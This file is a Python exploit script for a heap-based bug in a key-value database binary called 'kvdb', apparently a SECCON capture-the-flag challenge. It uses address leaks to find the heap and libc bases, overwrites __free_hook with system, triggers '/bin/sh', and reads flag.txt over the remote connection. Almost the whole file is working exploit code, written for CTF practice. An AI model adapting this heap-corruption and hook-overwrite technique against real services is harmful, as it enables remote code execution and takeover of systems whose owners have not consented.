#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
from functools import reduce

bin_file = './kvdb'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

default_host = {'host':'target', 'port':4296}

env = Environment('debug', 'local', 'remote', 'monitor')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET', monitor = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':['./ld.so', '--library-path', '.', bin_file]}, \
                        remote  = default_host, \
                        monitor = {'host':os.environ['SECCON_HOST'], 'port':int(os.environ['SECCON_PORT'])} if 'SECCON_HOST' in os.environ else default_host)
env.set_item('libc',    debug   = None, \
                        local   = 'libc.so.6', \
                        remote  = 'libc.so.6', \
                        monitor = 'libc.so.6')
env.select('monitor')

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

new_hash    = lambda s : reduce(lambda h,c: h*33+c, [5381]+list(map(ord, s))) & ((1<<32)-1)
protect_ptr = lambda pos, ptr: ptr if env.libc is None else pos >> 12 ^ ptr 

def attack(conn, **kwargs):
    db = KVDB(conn)

    # extend to 0x200 bytes
    db.put('a'*7, 0x1f0, 'AAAA')

    # extend to 0x800 bytes
    db.put('target1', 0x220, '1111')
    db.delete('target1')

    # GC
    for i in range(4):
        alloc_useless(db, '{:07}'.format(i), 0xf8)

    db.delete('a'*7)

    # shrink to 0x400 bytes
    for i in range(4):
        alloc_useless(db, '{:07}'.format(i), 0x140)

    db.put('target2', 0x88, '2222')

    exploit  = b'1111'.ljust(0x208, b'\x00')
    exploit += p64(0x31)
    exploit += p32(1)
    exploit += p32(new_hash('target2'))
    exploit += p64(0x300)
    db.put('target1', 0x220, exploit)

    leak = db.get('target2')
    addr_heap_base = u64(leak[0x2a8:0x2a8+8]) - 0x710
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    addr_libc_mainarena = u64(leak[0x2c8:0x2c8+8]) - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']

    db.delete('target1')
    db.delete('target2')
 
    # shrink to 0x200 bytes -> 0x100 bytes
    for x in [0x200, 0x1c0]:
        alloc_useless(db, 'a'*7, x)
        alloc_useless(db, 'a'*7, 0x8)

    # GC x2
    for _ in range(2):
        alloc_useless(db, 'a'*7, 0xc0)
        alloc_useless(db, 'a'*7, 0x8)

    # extend to 0x400 bytes
    alloc_useless(db, 'a'*7, 0x200)

    exploit  = b'2222'.ljust(0x290, b'\x00')
    exploit += p64(0x31)
    exploit += p32(1)
    exploit += p32(new_hash('target2'))
    exploit += p64(0x300)
    exploit += p64(addr_heap_base + 0x5a8)
    exploit += p64(addr_heap_base + 0x718)
    exploit += p64(0)
    exploit += p64(0x111)
    exploit += p64(protect_ptr(addr_heap_base + 0x9e0, addr_libc_free_hook - 0x50))
    db.put('target2', len(exploit), exploit)

    db.delete('target2')

    # shrink to 0x200 bytes -> 0x100 bytes
    for _ in range(2):
        alloc_useless(db, 'a'*7, 0x1c8)
        alloc_useless(db, 'a'*7, 0x8)

    sh_key = '/bin/sh;#'.ljust(0xe, '_')
    alloc_useless(db, sh_key + chr(0x100 - new_hash(sh_key+'\x00')&0xff), 0xb0)
    db.put('exploit', 0x8, p64(addr_libc_system))

    # GC trigger system
    alloc_useless(db, 'a'*7, 0xa8)
    db.put('system!', 0)

def alloc_useless(db, key, size):
    db.put(key, size, 'XXXX')
    db.put(key, 0)
    db.delete(key)

class KVDB:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def put(self, key, size, data=None):
        self.sendlineafter('> ', '1')
        self.sendlineafter('Key : ', key)
        self.sendlineafter('Size : ', str(size))
        if data is not None:
            self.sendafter('Data : ', data)

    def get(self, key):
        self.sendlineafter('> ', '2')
        self.sendlineafter('Key : ', key)
        self.recvuntil('----\n')
        return self.recvuntil('\n----', drop=True)

    def delete(self, key):
        self.sendlineafter('> ', '3')
        self.sendlineafter('Key : ', key)

def getflag(conn, **kwargs):
    sleep(0.1)
    conn.sendline('exec 2>&1')
    sleep(0.1)
    conn.sendline('echo FLAG_HERE; cat flag.txt')
    conn.recvuntil('FLAG_HERE\n')
    print('FLAG : %s' % conn.recvuntil('\n', drop=True))

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)

    if env.check('monitor'):
        comn.run(getflag)
    else:
        comn.interactive()

if __name__=='__main__':
    main()

#==========
